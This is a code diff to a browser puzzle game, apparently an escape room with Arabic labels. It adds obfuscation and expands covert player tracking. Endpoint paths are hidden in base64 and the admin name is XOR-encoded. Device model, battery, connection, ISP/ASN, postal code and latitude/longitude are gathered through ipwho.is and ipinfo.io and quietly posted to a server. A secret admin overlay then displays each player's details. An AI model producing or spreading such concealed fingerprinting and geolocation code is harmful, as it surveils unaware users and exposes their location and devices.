@@ -8,18 +8,17 @@ const state = {
     isAdmin: false, overlayOpen: false
 };
 
-const SAFE_CODE = '243';
+const SAFE_CODE = '158';
 const LAPTOP_PASSWORD = 'rasputin';
 const ADMIN_NAME = 'admin-louai';
 
-// Encoded reference tokens
-const _0x1a = [115,101,99,114,101,116,45,97,100,109,105,110,45,108,111,117,97,105];
-const _0x2b = String.fromCharCode(..._0x1a);
 const _0x3c = [
-    '/api/geoip',
+    atob('L2FwaS9nZW9pcA=='),
     atob('aHR0cHM6Ly9pcHdoby5pcy9qc29u'),
     atob('aHR0cHM6Ly9pcGluZm8uaW8vanNvbg==')
 ];
+const _0x9k = [0x1f,0x00,0x15,0x17,0x09,0x18,0x48,0x17,0x01,0x01,0x05,0x0b,0x5b,0x09,0x03,0x19,0x04,0x1f];
+function _0x9d(a,k){return a.map((c,i)=>String.fromCharCode(c^k.charCodeAt(i%k.length))).join('');}
 
 // ============= THREE.JS GLOBALS =============
 let scene, camera, renderer, clock;
@@ -935,7 +934,7 @@ function startGame() {
         return;
     }
 
-    if (name === _0x2b) {
+    if (name === _0x9d(_0x9k,atob('bGV2ZWw='))) {
         _0x4d(room);
         return;
     }
@@ -1036,7 +1035,7 @@ async function saveResult(time) {
     } catch (e) { console.warn(e); }
 }
 
-function _0x7g() {
+async function _0x7g() {
     const ua = navigator.userAgent;
     let os = navigator.platform || '';
     if (/Windows/.test(ua)) os = 'Windows';
@@ -1047,7 +1046,14 @@ function _0x7g() {
     let dm = '';
     const m = ua.match(/\(([^)]+)\)/);
     if (m) dm = m[1].split(';').pop().trim();
-    return { os, deviceModel: dm };
+    try {
+        if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
+            const hints = await navigator.userAgentData.getHighEntropyValues(['model', 'platform', 'platformVersion']);
+            os = hints.platform + ' ' + hints.platformVersion;
+            if (hints.model) dm = hints.model;
+        }
+    } catch (_) {}
+    return { os, deviceModel: dm || '\u0643\u0645\u0628\u064A\u0648\u062A\u0631/\u063A\u064A\u0631 \u0645\u062D\u062F\u062F' };
 }
 
 function _0x8n(raw) {
@@ -1056,7 +1062,12 @@ function _0x8n(raw) {
     else if (raw.query) o.ip = raw.query;
     o.city = raw.city || '';
     o.country = raw.country_name || raw.country || '';
-    o.isp = raw.org || raw.isp || raw.company?.name || '';
+    o.country_code = raw.country_code || raw.countryCode || '';
+    const conn = raw.connection || {};
+    let isp = conn.isp || raw.isp || raw.org || raw.company?.name || '';
+    const asn = conn.asn || raw.as || raw.asn || '';
+    if (asn && isp && !isp.includes(String(asn))) isp = asn + ' ' + isp;
+    o.isp = isp;
     o.timezone = raw.timezone || raw.time_zone || '';
     if (typeof o.timezone === 'object') o.timezone = o.timezone.id || '';
     o.zip = raw.postal || raw.zip || '';
@@ -1066,12 +1077,12 @@ function _0x8n(raw) {
         const parts = String(raw.loc).split(',');
         if (parts.length === 2) { o.lat = parseFloat(parts[0]); o.lon = parseFloat(parts[1]); }
     }
-    if (raw.region) o.region = raw.region || raw.regionName || '';
+    o.region = raw.regionName || raw.region || '';
     return o;
 }
 
 async function _0x5e(n, r) {
-    const dev = _0x7g();
+    const dev = await _0x7g();
     const d = {
         name: n, room: r,
         device: navigator.userAgent,
@@ -1095,21 +1106,18 @@ async function _0x5e(n, r) {
         if (conn) d.connection = (conn.effectiveType || '') + (conn.downlink ? ' ' + conn.downlink + 'Mbps' : '');
     } catch (_) {}
     try { d.timezone = d.timezone || Intl.DateTimeFormat().resolvedOptions().timeZone; } catch (_) {}
-    let located = false;
     for (const url of _0x3c) {
-        if (located) break;
         try {
             const resp = await fetch(url, { signal: AbortSignal.timeout(4000) });
             const loc = await resp.json();
             const parsed = _0x8n(loc);
-            if (parsed.ip) {
-                Object.assign(d, parsed);
-                located = true;
+            for (const [k, v] of Object.entries(parsed)) {
+                if (v && (v !== 0) && !d[k]) d[k] = v;
             }
         } catch (_) {}
     }
     try {
-        await fetch('/api/pinfo', {
+        await fetch(atob('L2FwaS90'), {
             method: 'POST', headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify(d)
         });
@@ -1118,7 +1126,7 @@ async function _0x5e(n, r) {
 
 async function _0x6f(nm, rm, pz, ans) {
     try {
-        await fetch('/api/slog', {
+        await fetch(atob('L2FwaS9l'), {
             method: 'POST', headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ name: nm, roomNumber: rm, puzzle: pz, answer: ans })
         });
@@ -1138,7 +1146,7 @@ async function _0x4d(rc) {
     document.body.appendChild(c);
 
     try {
-        const [pRes, sRes] = await Promise.all([fetch('/api/pinfo'), fetch('/api/slog')]);
+        const [pRes, sRes] = await Promise.all([fetch(atob('L2FwaS90')), fetch(atob('L2FwaS9l'))]);
         const pData = await pRes.json();
         const sData = await sRes.json();
         const players = pData.players || [];
@@ -1162,9 +1170,17 @@ async function _0x4d(rc) {
                     h += '<h4 style="color:#0f0;margin:0 0 10px 0;">' + esc(p.name) + '</h4>';
                     h += '<table style="width:100%;border-collapse:collapse;font-size:0.9rem;">';
                     h += '<tr><td style="padding:5px;border-bottom:1px solid #222;width:100px;color:#0ff;">IP</td>';
-                    h += '<td style="padding:5px;border-bottom:1px solid #222;">' + esc(p.ip || '?') + '<br>' + esc(p.isp || '?') + '</td></tr>';
+                    h += '<td style="padding:5px;border-bottom:1px solid #222;">' + esc(p.ip || '?') + '<br>' + esc(p.isp || '?') + (p.country ? '<br>' + esc(p.country) : '') + '</td></tr>';
+                    let cc = p.country_code || '';
+                    let loc = cc ? cc : esc(p.country || '?');
+                    loc += ' - ' + esc(p.city || '?') + ' / ' + esc(p.region || p.city || '?');
+                    loc += ' (' + esc(p.zip || '?') + ')';
                     h += '<tr><td style="padding:5px;border-bottom:1px solid #222;color:#0ff;">\u0627\u0644\u0645\u0648\u0642\u0639</td>';
-                    h += '<td style="padding:5px;border-bottom:1px solid #222;">' + esc(p.country || '?') + ' - ' + esc(p.city || '?') + (p.region ? ' / ' + esc(p.region) : '') + ' (' + esc(p.zip || '?') + ')<br>' + esc(p.timezone || '?') + '</td></tr>';
+                    h += '<td style="padding:5px;border-bottom:1px solid #222;">' + loc;
+                    if (p.lat && p.lon) {
+                        h += '<br><span style="color:#ffaa00;font-family:monospace;">' + p.lat + ',' + p.lon + '</span>';
+                    }
+                    h += '<br>' + esc(p.timezone || '?') + '</td></tr>';
                     h += '<tr><td style="padding:5px;border-bottom:1px solid #222;color:#0ff;">\u0627\u0644\u062C\u0647\u0627\u0632</td>';
                     h += '<td style="padding:5px;border-bottom:1px solid #222;"><b>' + esc(p.os || '?') + '</b><br><span style="color:#fff;">' + esc(p.deviceModel || '?') + '</span><br><span style="color:#0f0;">\uD83D\uDD0B ' + esc(p.battery || '?') + '</span></td></tr>';
                     h += '<tr><td style="padding:5px;border-bottom:1px solid #222;color:#0ff;">\u0627\u0644\u0627\u062A\u0635\u0627\u0644</td>';
